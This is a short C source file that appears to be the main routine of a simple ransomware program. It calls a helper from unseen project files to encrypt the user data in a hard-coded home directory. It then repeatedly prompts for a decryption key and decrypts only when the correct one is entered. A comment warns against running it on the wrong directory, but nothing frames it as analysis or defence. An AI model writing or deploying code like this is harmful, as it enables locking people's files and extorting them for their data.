#include <stdio.h>
#include "src/IO/traverse.h"
#include "src/shared.h"

/*
 * Warning! Do Not Run This Yourself Until You're Sure About The Target Directory!
 * */
int main() {
    const char* tg_path = "/home/userdq/Downloads/Applications/Windows";
    traverse_in(tg_path, key, 0); // encrypts the user data in target directory
    long long key_in = 0;
    while (1) {
        printf("DecryptionKey(%ds_sleep)> ", waiting_time);
        scanf("%lld", &key_in);
        if (traverse_in(tg_path, key_in, 1)) break;
    }
}
